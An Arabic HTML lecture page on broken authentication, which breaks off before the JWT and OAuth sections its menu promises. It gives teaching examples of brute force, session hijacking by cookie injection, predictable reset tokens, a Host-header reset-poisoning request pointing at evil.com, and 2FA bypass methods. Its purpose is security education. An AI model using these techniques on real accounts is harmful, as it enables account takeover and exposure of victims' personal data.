<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محاضرة Broken Authentication + OAuth</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; line-height: 1.6; color: #e8eaed; background: #151b2f; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 48px; padding: 64px 24px; background: linear-gradient(135deg, #1a2125, #203942); border-radius: 12px; box-shadow: 0 4px 24px rgb(33, 48, 70); }
        .header h1 { font-size: 2.5rem; font-weight: 400; color: #ffffff; margin-bottom: 16px; letter-spacing: -0.5px; }
        .header .subtitle { font-size: 1.1rem; font-weight: 300; color: rgba(255, 255, 255, 0.9); margin-bottom: 24px; }
        .lecture-info { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
        .info-item { background: rgba(255, 255, 255, 0.2); padding: 12px 24px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.3); color: #ffffff; font-weight: 500; }
        .info-item i { color: #ffffff; margin-left: 8px; }
        .nav-menu { background: #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 32px; border: 1px solid #2d3748; box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4); }
        .nav-menu h3 { color: #e8eaed; font-size: 1.5rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
        .nav-menu ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
        .nav-menu a { display: flex; align-items: center; padding: 12px 16px; color: #e8eaed; text-decoration: none; border-radius: 8px; transition: all 0.2s ease; border: 1px solid transparent; }
        .nav-menu a:hover { background: #2d3748; border-color: #3b475d; }
        section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
        h2 { color: #ffffff; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
        h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
        .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
        .code-block { background: #0b1222; border: 1px solid #1e293b; border-radius: 10px; padding: 16px; color: #e5e7eb; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', monospace; overflow-x: auto; margin: 16px 0; font-size: 0.9rem; line-height: 1.5; }
        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
        .lab-card h4 { color: #ffffff; margin-bottom: 8px; }
        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
        .lab-link { display: inline-block; background: #3b82f6; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
        .lab-link:hover { background: #2563eb; }
        .mermaid { 
            background: #1a2332 !important; 
            border: 1px solid #2d3748; 
            border-radius: 8px; 
            padding: 16px; 
            margin: 16px 0; 
            color: #e8eaed !important;
        }
        
        /* تأكيد أن جميع عناصر Mermaid تستخدم الألوان الداكنة */
        .mermaid svg {
            background: #1a2332 !important;
        }
        
        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
            fill: #1a2332 !important;
            stroke: #2d3748 !important;
            color: #e8eaed !important;
        }
        
        .mermaid .edgeLabel {
            background-color: #1a2332 !important;
            color: #e8eaed !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-user-lock"></i> Broken Authentication + OAuth 2.0</h1>
            <div class="subtitle">مصادقة ضعيفة، إدارة جلسات غير آمنة، وأخطاء تكامل OAuth</div>
            <div class="lecture-info">
                <div class="info-item"><i class="fas fa-clock"></i> ساعتان</div>
                <div class="info-item"><i class="fas fa-flask"></i> 15 مختبر</div>
                <div class="info-item"><i class="fas fa-signal"></i> متوسط إلى متقدم</div>
                <div class="info-item"><i class="fas fa-shield-alt"></i> حماية شاملة</div>
            </div>
        </div>

        <div class="nav-menu">
            <h3>محتويات المحاضرة</h3>
            <ul>
                <li><a href="#intro"><i class="fas fa-info-circle"></i> مقدمة</a></li>
                <li><a href="#auth-basics"><i class="fas fa-key"></i> أساسيات المصادقة وإدارة الجلسات</a></li>
                <li><a href="#broken-auth-types"><i class="fas fa-lock-open"></i> أنواع Broken Authentication</a></li>
                <li><a href="#jwt-basics"><i class="fas fa-shield-alt"></i> مقدمة JWT: التوقيع vs التشفير</a></li>
                <li><a href="#jwt-attacks"><i class="fas fa-bomb"></i> هجمات JWT (JWS)</a></li>
                <li><a href="#jwe-attacks"><i class="fas fa-lock"></i> هجمات JWE (التشفير)</a></li>
                <li><a href="#oauth-basics"><i class="fab fa-osi"></i> أساسيات OAuth 2.0</a></li>
                <li><a href="#oauth-attacks"><i class="fas fa-bug"></i> هجمات OAuth الشائعة</a></li>
                <li><a href="#labs"><i class="fas fa-flask"></i> مختبرات عملية (10)</a></li>
                <li><a href="#defense"><i class="fas fa-shield-halved"></i> طرق الحماية</a></li>
                <li><a href="#summary"><i class="fas fa-list-check"></i> الخلاصة</a></li>
            </ul>
        </div>

        <section id="intro">
            <h2><i class="fas fa-info-circle"></i> مقدمة - ما هو Broken Authentication؟</h2>
            
            <p>مرحباً بكم في المحاضرة الخامسة من سلسلة أمان تطبيقات الويب! 🎯</p>
            
            <p>تخيل أن منزلك له قفل إلكتروني، ولكن هذا القفل به عيوب: أحياناً يفتح بكلمة مرور خاطئة، وأحياناً ينسى أن يتحقق من هويتك، وأحياناً يمكن خداعه بسهولة. هذا بالضبط ما يحدث في <strong>ثغرات Broken Authentication</strong>!</p>

            <p><strong>Broken Authentication</strong> هي واحدة من أخطر الثغرات في تطبيقات الويب حسب OWASP Top 10. تحدث عندما يفشل التطبيق في التحقق من هوية المستخدمين بشكل صحيح، مما يسمح للمهاجمين بالوصول غير المشروع للحسابات.</p>
            
            <div class="tip">
                <h4><i class="fas fa-lightbulb"></i> ما ستتعلمه في هذه المحاضرة</h4>
                <ul class="list">
                    <li>🎯 فهم مفهوم المصادقة المكسورة من الصفر بأمثلة عملية</li>
                    <li>🖼️ رسوم توضيحية تشرح كيف تعمل الثغرات بصرياً</li>
                    <li>🔐 شرح مفصل لـ JWT وأنواع التشفير (JWS vs JWE)</li>
                    <li>🔓 OAuth 2.0 وثغراته الشائعة مع أمثلة حقيقية</li>
                    <li>⚔️ 8 أنواع مختلفة من هجمات المصادقة</li>
                    <li>🧪 15 مختبر عملي متدرج الصعوبة من PortSwigger</li>
                    <li>🛡️ طرق الحماية الشاملة والدفاع</li>
                    <li>🔧 أدوات الاختبار والاكتشاف المتقدمة</li>
                </ul>
            </div>

            <div class="mermaid">
graph TD
    A[المستخدم يحاول تسجيل الدخول] --> B{التطبيق الآمن؟}
    B -->|✅ آمن| C[يتحقق من كلمة المرور]
    B -->|❌ غير آمن| D[يقبل كلمة مرور ضعيفة]
    
    C --> E{كلمة المرور صحيحة؟}
    E -->|نعم| F[ينشئ جلسة آمنة]
    E -->|لا| G[يرفض الدخول]
    
    D --> H[ينشئ جلسة غير آمنة]
    F --> I[المستخدم يدخل بأمان]
    H --> J[❌ المهاجم يمكنه اختطاف الجلسة]
    G --> K[المستخدم محمي]
    
    style D fill:#ffebee
    style H fill:#ffebee  
    style J fill:#ffebee
    style F fill:#e8f5e8
    style I fill:#e8f5e8
    style K fill:#e8f5e8
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> لماذا Broken Authentication خطيرة جداً؟</h4>
                <p>تخيل أن شخص غريب يستطيع فتح باب منزلك، والدخول لحسابك البنكي، وقراءة رسائلك الخاصة، والتسوق باسمك! هذا بالضبط ما يحدث عندما تكون المصادقة مكسورة:</p>
                <ul class="list">
                    <li><strong>💰 خسائر مالية:</strong> سرقة الأموال من الحسابات البنكية</li>
                    <li><strong>🔐 اختراق الحسابات:</strong> الوصول لحسابات التواصل الاجتماعي والبريد الإلكتروني</li>
                    <li><strong>📱 سرقة الهوية:</strong> انتحال شخصية المستخدمين</li>
                    <li><strong>📊 تسريب البيانات:</strong> كشف معلومات شخصية حساسة</li>
                    <li><strong>🏢 ضرر السمعة:</strong> فقدان ثقة العملاء في الشركة</li>
                </ul>
            </div>

            <div class="warn">
                <h4>📋 ملاحظات مهمة للمختبرات</h4>
                <ul class="list">
                    <li><strong>PortSwigger Labs:</strong> جميع المختبرات تتطلب حساب مجاني على PortSwigger Academy</li>
                    <li><strong>Exploit Server:</strong> في المختبرات، "YOUR-EXPLOIT-SERVER" يشير للخادم المقدم من PortSwigger</li>
                    <li><strong>Burp Suite:</strong> استخدم Burp Suite Community (مجاني) أو Professional لحل المختبرات</li>
                    <li><strong>التعلم الآمن:</strong> جميع المختبرات في بيئة آمنة ومعزولة</li>
                </ul>
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> تحذير مهم</h4>
                <p><strong>هذه المحاضرة لأغراض تعليمية فقط!</strong> 📚</p>
                <p>لا تستخدم هذه التقنيات على أنظمة لا تملك إذناً قانونياً لاختبارها. الاستخدام غير المشروع لهذه التقنيات قد يعرضك للمساءلة القانونية. استخدم المختبرات المخصصة للتعلم فقط.</p>
            </div>
        </section>

        <section id="auth-concept">
            <h2><i class="fas fa-lightbulb"></i> فهم المفهوم بالرسوم التوضيحية</h2>
            
            <h3><i class="fas fa-eye"></i> مثال بصري بسيط - مطعم مع نادل</h3>
            
            <div class="attack-demo">
                <h4>🍽️ مثال المطعم - سيناريو المصادقة</h4>
                <div class="mermaid">
graph TD
    subgraph "مطعم آمن ✅"
        A1[زبون جديد يدخل المطعم] --> B1[النادل: ما اسمك؟]
        B1 --> C1[الزبون: أحمد محمد]
        C1 --> D1[النادل: هل لديك حجز؟]
        D1 --> E1[الزبون: نعم، رقم الحجز 1234]
        E1 --> F1[النادل يتحقق من قائمة الحجوزات]
        F1 --> G1[✅ الحجز موجود]
        G1 --> H1[النادل: تفضل طاولتك رقم 5]
    end
    
    subgraph "مطعم غير آمن ❌"
        A2[مهاجم يدخل المطعم] --> B2[النادل: ما اسمك؟]
        B2 --> C2[المهاجم: أحمد محمد]
        C2 --> D2[❌ النادل لا يطلب إثبات هوية]
        D2 --> E2[النادل: تفضل أي طاولة تريد]
        E2 --> F2[❌ المهاجم يجلس في طاولة شخص آخر]
        F2 --> G2[❌ يأكل طعام الآخرين مجاناً]
    end
    
    style A2 fill:#ffebee
    style D2 fill:#ffebee
    style E2 fill:#ffebee
    style F2 fill:#ffebee
    style G2 fill:#ffebee
                </div>
                
                <p><strong>في عالم التطبيقات:</strong> النادل = التطبيق، الحجز = كلمة المرور، الطاولة = الحساب الشخصي</p>
            </div>

            <div class="attack-demo">
                <h4>📊 مقارنة: التطبيق الآمن vs غير الآمن</h4>
                <div class="mermaid">
graph LR
    subgraph "تطبيق آمن ✅"
        A1[المستخدم يدخل<br/>username + password] --> B1[التطبيق يتحقق<br/>من قاعدة البيانات]
        B1 --> C1{كلمة المرور<br/>صحيحة؟}
        C1 -->|نعم| D1[ينشئ session آمنة<br/>مع انتهاء صلاحية]
        C1 -->|لا| E1[يرفض الدخول<br/>ويسجل المحاولة]
        D1 --> F1[يدخل المستخدم<br/>بأمان]
    end
    
    subgraph "تطبيق غير آمن ❌"
        A2[المستخدم يدخل<br/>username + password] --> B2[❌ التطبيق لا يتحقق<br/>أو يتحقق بشكل ضعيف]
        B2 --> C2[❌ يقبل كلمات مرور<br/>ضعيفة أو فارغة]
        C2 --> D2[❌ ينشئ session غير آمنة<br/>بدون انتهاء صلاحية]
        D2 --> E2[❌ يمكن للمهاجم<br/>اختطاف الجلسة]
    end
    
    style A2 fill:#ffebee
    style B2 fill:#ffebee
    style C2 fill:#ffebee
    style D2 fill:#ffebee
    style E2 fill:#ffebee
                </div>
            </div>

            <div class="tip">
                <h4><i class="fas fa-brain"></i> نصائح لفهم Broken Authentication بسهولة</h4>
                <ul class="list">
                    <li><strong>🔑 القاعدة الذهبية:</strong> أي تطبيق لا يتحقق جيداً من هويتك = خطر</li>
                    <li><strong>🎯 ابحث عن:</strong> صفحات تسجيل الدخول، reset password، تغيير كلمة المرور</li>
                    <li><strong>🧪 اختبر دائماً:</strong> كلمات مرور ضعيفة، جلسات منتهية الصلاحية</li>
                    <li><strong>⚠️ علامات الخطر:</strong> إذا دخلت بكلمة مرور خاطئة = ثغرة موجودة</li>
                </ul>
            </div>
        </section>

        <section id="auth-basics">
            <h2><i class="fas fa-key"></i> أساسيات المصادقة وإدارة الجلسات</h2>
            
            <h3><i class="fas fa-question-circle"></i> ما الفرق بين Authentication و Authorization؟</h3>
            
            <div class="mermaid">
graph TD
    A[مستخدم يريد الدخول] --> B[Authentication: من أنت؟]
    B --> C[يدخل username + password]
    C --> D{هل البيانات صحيحة؟}
    D -->|نعم| E[✅ تم التحقق من الهوية]
    D -->|لا| F[❌ رفض الدخول]
    
    E --> G[Authorization: ماذا يحق لك أن تفعل؟]
    G --> H[التحقق من الصلاحيات]
    H --> I[عرض المحتوى المسموح فقط]
    
    style E fill:#e8f5e8
    style F fill:#ffebee
    style I fill:#e8f5e8
            </div>

            <div class="grid">
                <div class="card">
                    <h3>🔐 Authentication (المصادقة)</h3>
                    <ul class="list">
                        <li><strong>السؤال:</strong> من أنت؟</li>
                        <li><strong>الهدف:</strong> التحقق من هوية المستخدم</li>
                        <li><strong>الطرق:</strong> username/password، بصمة، رمز SMS</li>
                        <li><strong>المثال:</strong> إدخال كلمة المرور لفتح الهاتف</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h3>🔑 Authorization (التفويض)</h3>
                    <ul class="list">
                        <li><strong>السؤال:</strong> ماذا يحق لك أن تفعل؟</li>
                        <li><strong>الهدف:</strong> تحديد الصلاحيات والأذونات</li>
                        <li><strong>الطرق:</strong> Roles، Permissions، ACLs</li>
                        <li><strong>المثال:</strong> هل يمكنك حذف هذا الملف؟</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h3>🔄 Session Management (إدارة الجلسات)</h3>
                    <ul class="list">
                        <li><strong>الهدف:</strong> تتبع المستخدم بعد تسجيل الدخول</li>
                        <li><strong>الطرق:</strong> Cookies، JWT، Server Sessions</li>
                        <li><strong>المشكلة:</strong> جلسات غير آمنة أو منتهية الصلاحية</li>
                        <li><strong>المثال:</strong> البقاء مسجل دخول في موقع التسوق</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>الجلسات وملفات تعريف الارتباط</h3>
                    <ul class="list">
                        <li>HttpOnly, Secure, SameSite</li>
                        <li>Session Fixation, Session Hijacking</li>
                        <li>CSRF Tokens مع حماية SameSite</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="attack-scenarios">
            <h2><i class="fas fa-crosshairs"></i> سيناريوهات الهجوم الحقيقية</h2>

            <h3><i class="fas fa-shopping-cart"></i> سيناريو 1: متجر إلكتروني - كسر كلمة المرور</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> اختراق حسابات العملاء في متجر إلكتروني</p>
                
                <div class="mermaid">
graph TD
    A[المهاجم يكتشف صفحة تسجيل الدخول] --> B[يجرب كلمات مرور شائعة]
    B --> C{التطبيق يحمي من<br/>Brute Force؟}
    C -->|لا ❌| D[يستخدم قائمة كلمات مرور]
    C -->|نعم ✅| E[الهجوم يفشل]
    
    D --> F[password, 123456, admin]
    F --> G[يجد حسابات بكلمات مرور ضعيفة]
    G --> H[يدخل لحسابات العملاء]
    H --> I[يسرق معلومات الدفع والعناوين]
    
    style C fill:#ffebee
    style D fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style H fill:#ffebee
    style I fill:#ffebee
    style E fill:#e8f5e8
                </div>
                
                <div class="code-block">
# خطوات الهجوم العملية:
1. المهاجم يجد: https://shop.com/login
2. يجرب حسابات شائعة:
   - admin:admin
   - admin:password
   - test@shop.com:123456
3. إذا لم يكن هناك rate limiting:
   - يستخدم Burp Suite Intruder
   - يحمل قائمة 1000 كلمة مرور شائعة
   - يجرب على كل حساب عميل
4. النتيجة: يخترق 5-10% من الحسابات!

البيانات المسربة:
- أسماء وعناوين العملاء
- أرقام بطاقات ائتمان (آخر 4 أرقام)
- تاريخ الطلبات والمشتريات
- أرقام الهواتف
                </div>
            </div>

            <h3><i class="fas fa-university"></i> سيناريو 2: نظام جامعي - Session Hijacking</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> سرقة جلسات الطلاب للوصول لدرجاتهم وتعديلها</p>
                
                <div class="mermaid">
graph TD
    A[طالب يسجل دخول في مقهى إنترنت] --> B[يستخدم شبكة WiFi عامة]
    B --> C[المهاجم في نفس المقهى]
    C --> D[يستخدم Wireshark لمراقبة الشبكة]
    D --> E{هل الموقع يستخدم HTTPS؟}
    
    E -->|لا ❌| F[يسرق session cookie بسهولة]
    E -->|نعم ولكن...| G[يبحث عن Mixed Content]
    
    F --> H[يستخدم Cookie المسروق]
    G --> I[يجد طلبات HTTP غير مشفرة]
    I --> J[يسرق session من الطلبات غير الآمنة]
    
    H --> K[يدخل كالطالب الضحية]
    J --> K
    K --> L[يعدل الدرجات أو يسجل في مواد]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style I fill:#ffebee
    style J fill:#ffebee
    style K fill:#ffebee
    style L fill:#ffebee
                </div>
                
                <div class="code-block">
# أدوات الهجوم:
1. Wireshark: لمراقبة حركة المرور
2. Burp Suite: لتحليل الطلبات
3. Cookie Editor: لتعديل cookies في المتصفح

# الكود المستخدم:
document.cookie = "JSESSIONID=ABC123XYZ789; domain=.university.edu";
location.reload(); // إعادة تحميل الصفحة بالـ session الجديد

# النتيجة:
- الوصول لحساب الطالب الضحية
- رؤية الدرجات والجدول الدراسي
- إمكانية التسجيل في مواد أو إلغاء التسجيل
- الوصول لمعلومات شخصية حساسة
                </div>
            </div>

            <h3><i class="fas fa-hospital"></i> سيناريو 3: نظام طبي - Password Reset Vulnerability</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> الوصول لسجلات المرضى الطبية</p>
                
                <div class="mermaid">
graph TD
    A[المهاجم يجد صفحة Password Reset] --> B[يدخل email الضحية]
    B --> C[النظام يرسل رابط reset]
    C --> D[المهاجم يحلل رابط Reset]
    D --> E{هل الرابط قابل للتنبؤ؟}
    
    E -->|نعم ❌| F[reset.php?token=123456]
    E -->|لا ولكن...| G[يبحث عن طرق أخرى]
    
    F --> H[يجرب أرقام متسلسلة]
    G --> I[يجرب Password Reset Poisoning]
    
    H --> J[يجد tokens صالحة]
    I --> K[يغير Host header ليوجه email له]
    
    J --> L[يغير كلمة مرور الضحية]
    K --> M[يحصل على reset token]
    M --> L
    
    L --> N[يدخل لحساب الطبيب/المريض]
    N --> O[يصل للسجلات الطبية الحساسة]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style H fill:#ffebee
    style I fill:#ffebee
    style J fill:#ffebee
    style K fill:#ffebee
    style L fill:#ffebee
    style N fill:#ffebee
    style O fill:#ffebee
                </div>
                
                <div class="code-block">
# مثال Token ضعيف:
https://hospital.com/reset?token=1001
https://hospital.com/reset?token=1002  ← المهاجم يجرب
https://hospital.com/reset?token=1003

# Host Header Injection:
POST /forgot-password HTTP/1.1
Host: evil.com  ← تغيير الـ Host
Content-Type: application/x-www-form-urlencoded

email=doctor@hospital.com

# النتيجة:
Email يُرسل إلى doctor@hospital.com لكن الرابط يشير إلى:
https://evil.com/reset?token=ABC123

# البيانات المعرضة للخطر:
- سجلات طبية للمرضى
- تشخيصات ووصفات طبية
- معلومات التأمين الصحي
- بيانات شخصية حساسة (أمراض، عمليات)
                </div>
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> تأثير Broken Authentication على القطاعات الحساسة</h4>
                <ul class="list">
                    <li><strong>🏥 القطاع الطبي:</strong> تسريب سجلات المرضى وانتهاك خصوصيتهم</li>
                    <li><strong>🏦 القطاع المصرفي:</strong> سرقة أموال وبيانات مالية حساسة</li>
                    <li><strong>🎓 القطاع التعليمي:</strong> تعديل درجات وسرقة هويات أكاديمية</li>
                    <li><strong>🏢 الشركات:</strong> تسريب أسرار تجارية ومعلومات موظفين</li>
                    <li><strong>🛒 التجارة الإلكترونية:</strong> سرقة بيانات عملاء ومعلومات دفع</li>
                </ul>
            </div>
        </section>

        <section id="broken-auth-types">
            <h2><i class="fas fa-lock-open"></i> أنواع Broken Authentication الثمانية</h2>
            
            <p>هناك 8 أنواع رئيسية من ثغرات المصادقة المكسورة، كل نوع له أساليب استغلال مختلفة ومستويات خطورة متفاوتة:</p>

            <div class="attack-demo">
                <h4>🔓 1. Credential Attacks - هجمات كلمات المرور</h4>
                <p>الأكثر شيوعاً وخطورة - يشمل جميع الهجمات على كلمات المرور</p>
                
                <div class="grid">
                    <div class="card">
                        <h4>🔨 Brute Force</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> تجريب جميع التركيبات الممكنة</li>
                            <li><strong>المثال:</strong> 0000, 0001, 0002... 9999</li>
                            <li><strong>الهدف:</strong> كلمات مرور قصيرة أو رقمية</li>
                            <li><strong>الوقت:</strong> ساعات إلى أيام</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>📚 Dictionary Attack</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> استخدام قوائم كلمات مرور شائعة</li>
                            <li><strong>المثال:</strong> password, 123456, admin</li>
                            <li><strong>الهدف:</strong> كلمات مرور ضعيفة</li>
                            <li><strong>الوقت:</strong> دقائق إلى ساعات</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>🔄 Credential Stuffing</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> استخدام كلمات مرور مسربة</li>
                            <li><strong>المصدر:</strong> تسريبات قواعد بيانات سابقة</li>
                            <li><strong>الهدف:</strong> مستخدمين يعيدون استخدام كلمات المرور</li>
                            <li><strong>النجاح:</strong> 0.1-2% من المحاولات</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>💧 Password Spraying</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> كلمة مرور واحدة على حسابات كثيرة</li>
                            <li><strong>المثال:</strong> تجريب "Password123" على 1000 حساب</li>
                            <li><strong>الميزة:</strong> يتجنب account lockout</li>
                            <li><strong>الهدف:</strong> شركات بسياسات كلمات مرور ضعيفة</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🍪 2. Session Management Issues - مشاكل إدارة الجلسات</h4>
                <p>ثاني أخطر الثغرات - استغلال ضعف في إدارة جلسات المستخدمين</p>
                
                <div class="mermaid">
graph TD
    A[المستخدم يسجل دخول] --> B[التطبيق ينشئ Session]
    B --> C{هل Session آمن؟}
    C -->|لا ❌| D[Session ID قابل للتنبؤ<br/>مثل: USER123_20250108]
    C -->|نعم ✅| E[Session ID عشوائي<br/>مثل: a7b2f4d8e9c1...]
    
    D --> F[المهاجم يخمن Session IDs أخرى]
    F --> G[يدخل كمستخدمين آخرين]
    
    E --> H[لا يمكن تخمين Session]
    H --> I[الجلسة آمنة]
    
    style C fill:#ffebee
    style D fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style E fill:#e8f5e8
    style H fill:#e8f5e8
    style I fill:#e8f5e8
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>🔮 Predictable Session IDs</h4>
                        <p>Session IDs قابلة للتنبؤ أو تحتوي معلومات يمكن تخمينها</p>
                        <div class="code-block">
❌ أمثلة ضعيفة:
SESSIONID=USER123_20250108_001
JSESSIONID=12345
SESSION=admin_session_1

✅ أمثلة آمنة:
SESSIONID=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
JSESSIONID=9f8e7d6c5b4a39281f7e6d5c4b3a2918
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>🔒 Session Fixation</h4>
                        <p>المهاجم يحدد Session ID ويخدع الضحية لاستخدامه</p>
                        <div class="code-block">
# خطوات الهجوم:
1. المهاجم يحصل على session: ABC123
2. يرسل رابط للضحية: 
   site.com/login?JSESSIONID=ABC123
3. الضحية تسجل دخول بنفس Session
4. المهاجم يستخدم ABC123 ويدخل كالضحية
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>♻️ Session Not Rotated</h4>
                        <p>عدم تغيير Session ID بعد تسجيل الدخول أو تغيير الصلاحيات</p>
                        <div class="code-block">
❌ المشكلة:
1. المستخدم يزور الموقع: SESSION=ABC123
2. يسجل دخول: لا يزال SESSION=ABC123
3. إذا سُرق ABC123 قبل الدخول، المهاجم يدخل

✅ الحل:
1. المستخدم يزور الموقع: SESSION=ABC123
2. يسجل دخول: SESSION=XYZ789 (جديد)
3. Session القديم لا يعمل بعد الآن
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>⏰ Session Timeout Issues</h4>
                        <p>جلسات لا تنتهي أو تنتهي بعد وقت طويل جداً</p>
                        <div class="code-block">
❌ مشاكل شائعة:
- Session لا ينتهي أبداً
- Session ينتهي بعد أسابيع
- عدم انتهاء Session عند إغلاق المتصفح
- عدم إنهاء Session عند Logout

✅ الممارسة الآمنة:
- انتهاء تلقائي خلال 30 دقيقة من عدم النشاط
- انتهاء فوري عند Logout
- انتهاء عند إغلاق المتصفح (للمواقع الحساسة)
                        </div>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔄 3. Password Reset Vulnerabilities - ثغرات استرداد كلمة المرور</h4>
                <p>استغلال ضعف في آلية إعادة تعيين كلمة المرور</p>
                
                <div class="grid">
                    <div class="card">
                        <h4>🎯 Weak Reset Tokens</h4>
                        <div class="code-block">
❌ Tokens ضعيفة:
reset.php?token=12345
reset.php?token=user123_20250108
reset.php?token=md5(email)

# كيف يستغل المهاجم:
1. يطلب reset لحسابه: token=12345
2. يجرب tokens أخرى: 12346, 12347...
3. يجد token صالح لمستخدم آخر
4. يغير كلمة مرور الضحية

✅ Tokens آمنة:
reset.php?token=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
- 32+ حرف عشوائي
- تنتهي خلال 15 دقيقة
- تُستخدم مرة واحدة فقط
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>🌐 Host Header Injection</h4>
                        <div class="code-block">
# الهجوم:
POST /forgot-password HTTP/1.1
Host: evil.com  ← تغيير Host header
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

# النتيجة:
Email يُرسل لـ victim@company.com لكن الرابط:
https://evil.com/reset?token=ABC123

# عندما تضغط الضحية الرابط:
- تذهب لموقع المهاجم
- المهاجم يحصل على reset token
- يستخدمه لتغيير كلمة مرور الضحية
                        </div>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔐 4. Multi-Factor Authentication (2FA) Bypass</h4>
                <p>تجاوز المصادقة الثنائية بسبب تطبيق خاطئ</p>
                
                <div class="mermaid">
graph TD
    A[المستخدم يدخل username/password] --> B[✅ كلمة المرور صحيحة]
    B --> C[النظام يطلب 2FA code]
    C --> D[المستخدم يدخل كود خاطئ]
    D --> E{هل النظام يتحقق<br/>من 2FA بشكل صحيح؟}
    E -->|لا ❌| F[يسمح بالدخول رغم كود خاطئ]
    E -->|نعم ✅| G[يرفض الدخول]
    
    F --> H[المهاجم يتجاوز 2FA]
    G --> I[2FA يعمل بشكل صحيح]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style H fill:#ffebee
    style G fill:#e8f5e8
    style I fill:#e8f5e8
                </div>
                
                <div class="code-block">
# طرق تجاوز 2FA الشائعة:

1. Response Manipulation:
   - تغيير response من {"2fa_required": true} إلى false
   - تعديل status code من 401 إلى 200

2. Direct Access:
   - الدخول مباشرة لـ /dashboard بعد كلمة المرور
   - تجاهل خطوة 2FA

3. Brute Force 2FA:
   - تجريب جميع الأكواد من 000000 إلى 999999
   - استغلال عدم وجود rate limiting

4. Backup Code Abuse:
   - استخدام backup codes ضعيفة
   - تخمين backup codes قابلة للتنبؤ

5. SMS Interception:
   - SIM Swapping
   - SS7 attacks
   - Malware على الهاتف
                </div>
            </div>

            <div class="tip">
